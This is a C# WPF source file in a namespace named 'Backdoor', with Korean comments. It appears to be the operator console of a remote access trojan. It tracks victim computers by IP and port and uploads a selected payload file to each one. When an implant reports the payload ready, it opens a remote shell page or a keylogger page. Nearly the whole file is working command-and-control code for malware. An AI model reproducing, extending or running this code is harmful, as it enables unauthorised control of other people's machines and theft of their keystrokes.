using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;
using System.ComponentModel;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Diagnostics;

namespace Backdoor
{
    /// <summary>
    /// 피해자 컴퓨터의 정보를 담는 클래스
    /// </summary>
    public class TargetData
    {
        public string IP;
        public string Port;
        public bool Status;
        public TargetData(string IP,string Port, bool Status)   //정보 초기화
        {
            this.IP = IP;
            this.Port = Port;
            this.Status = Status;
        }
    }

    /// <summary>
    /// MainWindow.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class MainWindow : Window
    {
        Socket Client;
        Socket LogSock;
        ThreadStart Ts;
        Thread t;
        ShellPage shellPage;
        KeyLog keyLogPage;
        IPEndPoint RemoteEp;
        public static string PayloadPath = string.Empty;
        public static string ClientPath = string.Empty;
        List<TargetData> TargetList = new List<TargetData>();
        public MainWindow()
        {
            InitializeComponent();
        }
        
        /// <summary>
        /// 연결 시도 버튼을 눌렀을때 실행되는 부분
        /// </summary>
        private void TryConnect_Btn_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                RemoteEp = new IPEndPoint(IPAddress.Parse(AddrBox.Text), int.Parse(PortBox.Text));

                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                Client.Connect(RemoteEp);

                byte[] Flags = new byte[1];
                Flags[0] = 0;
                Client.Send(Flags);
                Client.Receive(Flags);
                CheckState(Flags[0], RemoteEp);
                LogSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                foreach (IPAddress Addr in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (Addr.AddressFamily == AddressFamily.InterNetwork)
                    {
                        LogSock.Bind(new IPEndPoint(Addr, RemoteEp.Port - 1));
                        break;
                    }
                }
                LogSock.Listen(3);
                Ts = new ThreadStart(RecvLog);
                t = new Thread(Ts);
                if (!t.IsAlive)
                {
                    t.Start();
                }
            }
            catch(Exception Ex)
            {
                Log(Ex.StackTrace);
            }
        }

        /// <summary>
        /// 상대로부터 로그를 전송받음
        /// </summary>
        public void RecvLog()
        {
                while (true)
                {
                    Socket AccSock = LogSock.Accept();
                    byte[] Buffer = new byte[4];
                    AccSock.Receive(Buffer);
                    byte[] Msg = new byte[BitConverter.ToInt32(Buffer, 0)];
                    AccSock.Receive(Msg);
                    Log(Encoding.UTF8.GetString(Msg));
                    if(Encoding.UTF8.GetString(Msg).Equals("페이로드 준비됨"))
                    {
                        if(ClientPath.Equals("ShellOpener"))
                        {
                            Dispatcher.BeginInvoke((Action)delegate
                            {
                                shellPage = new ShellPage(RemoteEp.Address);
                                shellPage.Show();
                            });
                        }
                        else if(ClientPath.Equals("KeyLogger"))
                        {
                            Dispatcher.BeginInvoke((Action)delegate
                            {
                                keyLogPage = new KeyLog();
                                keyLogPage.Show();
                            });
                        }
                        else
                        {
                            Process Payload = new Process();
                            ProcessStartInfo processStartInfo = new ProcessStartInfo();
                            processStartInfo.FileName = ClientPath;
                            Payload.StartInfo = processStartInfo;
                            Payload.Start();
                        }
                    }
                }
        }

        /// <summary>
        /// 로그 대화상자에 메시지를 출력
        /// </summary>
        /// <param name="Msg">출력할 메시지</param>
        public void Log(string Msg)
        {
            Dispatcher.BeginInvoke((Action)delegate
            {
                LogBox.AppendText(DateTime.Now + " | " + Msg + "\n");
            });
        }

        /// <summary>
        /// 시작 버튼이 눌렸을때 실행되는 부분
        /// </summary>
        private void Execute_Btn_Click(object sender, RoutedEventArgs e)
        {
            SelectPayload selectPayload = new SelectPayload();
            selectPayload.ShowDialog();
            try
            {
                string[] Epargs = TargetListBox.SelectedValue.ToString().Split(':');
                IPEndPoint RemoteEp = new IPEndPoint(IPAddress.Parse(Epargs[0]), int.Parse(Epargs[1]));

                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                Client.Connect(RemoteEp);

                byte[] Flags = new byte[1];
                byte[] Addrs = new byte[4];
                foreach (IPAddress Addr in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (Addr.AddressFamily == AddressFamily.InterNetwork)
                    {
                        Addrs = BitConverter.GetBytes(Addr.Address);
                        break;
                    }
                }
                Flags[0] = 1;

                Client.Send(Flags);
                Client.Send(Addrs);
                Client.Receive(Flags);

                CheckState(Flags[0], RemoteEp);

                Socket FileSender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                FileSender.Connect(RemoteEp.Address, RemoteEp.Port + 1);
                FileSender.SendFile(PayloadPath);
                FileSender.Close();
            }
            catch (Exception Ex)
            {
                Log(Ex.StackTrace);
            }
        }

        /// <summary>
        /// 상대로부터 들어오는 플래그가 무엇인지 판단함
        /// </summary>
        /// <param name="Flag">상대가 보낸 플래그</param>
        /// <param name="RemoteEp">상대의 정보</param>
        void CheckState (byte Flag , IPEndPoint RemoteEp)
        {
            foreach (var v in TargetListBox.Items)
            {
                if (!v.ToString().Contains(RemoteEp.ToString()))
                {
                    if (Flag == 1)
                    {
                        TargetListBox.Items.Add(RemoteEp + " : 대기 중");
                        Log(RemoteEp + " 의 상태는 대기중입니다");
                    }
                    else if (Flag == 2)
                    {
                        TargetListBox.Items.Add(RemoteEp + " : 실행 중");
                        Log(RemoteEp + " 의 상태는 실행중입니다");
                    }
                    return;
                }
            }
            if (!TargetListBox.HasItems)
            {
                if (Flag == 1)
                {
                    TargetListBox.Items.Add(RemoteEp + " : 대기 중");
                    Log(RemoteEp + "의 상태는 대기중입니다");
                }
                else if (Flag == 2)
                {
                    TargetListBox.Items.Add(RemoteEp + " : 실행 중");
                    Log(RemoteEp + " 의 상태는 실행중입니다");
                }
            }
        }

        private void PageTest_Btn_Click(object sender, RoutedEventArgs e)
        {
            shellPage.Show();
        }
    }
}
